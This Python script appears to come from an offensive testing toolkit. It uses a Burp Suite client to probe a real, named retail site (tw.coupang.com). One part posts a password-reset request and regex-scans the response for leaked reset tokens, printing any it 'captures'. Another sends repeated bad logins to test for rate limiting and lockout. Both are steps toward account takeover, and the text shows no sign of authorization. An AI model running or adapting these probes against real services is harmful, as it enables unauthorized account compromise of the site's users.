import sys, re
sys.path.insert(0, 'CaseCrack')
from tools.burp_enterprise.core import BurpClient, clear_burp_discovery_cache
import logging

logging.basicConfig(level=logging.WARNING)

clear_burp_discovery_cache()
client = BurpClient()
ok = client.connect()
print(f'Burp connected: {ok}')

if not ok:
    print('ERROR: Burp not connected. Ensure Intercept is OFF.')
    sys.exit(1)

# ── CHAIN 2: Raw reset response ──────────────────────────────────────────────
RESET_URL = 'https://www.tw.coupang.com/password/reset'
TOKEN_PARAMS = ["token", "reset_token", "code", "key", "id", "t", "tk", "hash"]

print('\n=== CHAIN 2 — POST /password/reset raw probe ===')
try:
    resp = client.request('POST', RESET_URL, headers={}, data={'email': 'test@example.com'})
    print(f'Status: {resp.status_code}')
    print(f'Content-Type: {resp.headers.get("Content-Type","?")}')
    body = resp.text[:3000]
    print(f'Body (first 3000 chars):\n{body}')
    print('\n--- Token param hits ---')
    for param in TOKEN_PARAMS:
        if param in body.lower():
            m = re.search(rf'{param}["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]+)', body, re.IGNORECASE)
            if m:
                print(f'  [{param}] match: "{m.group(0)}" → captured token: "{m.group(1)}"')
except Exception as e:
    print(f'Reset probe error: {e}')

# ── CHAIN 1: Raw login response (first attempt) ───────────────────────────────
LOGIN_URL = 'https://www.tw.coupang.com/login'
print('\n=== CHAIN 1 — POST /login raw probe (3 attempts) ===')
for i in range(3):
    try:
        resp = client.request('POST', LOGIN_URL, headers={},
                              data={'username': f'user{i}@test.com', 'password': 'wrongpass123'})
        print(f'Attempt {i+1}: status={resp.status_code}  rate-limit-header={resp.headers.get("X-RateLimit-Remaining","none")}  retry-after={resp.headers.get("Retry-After","none")}')
        if resp.status_code in (429, 423):
            print(f'  !! Lockout/rate-limit detected at attempt {i+1}')
    except Exception as e:
        print(f'  Login attempt {i+1} error: {e}')

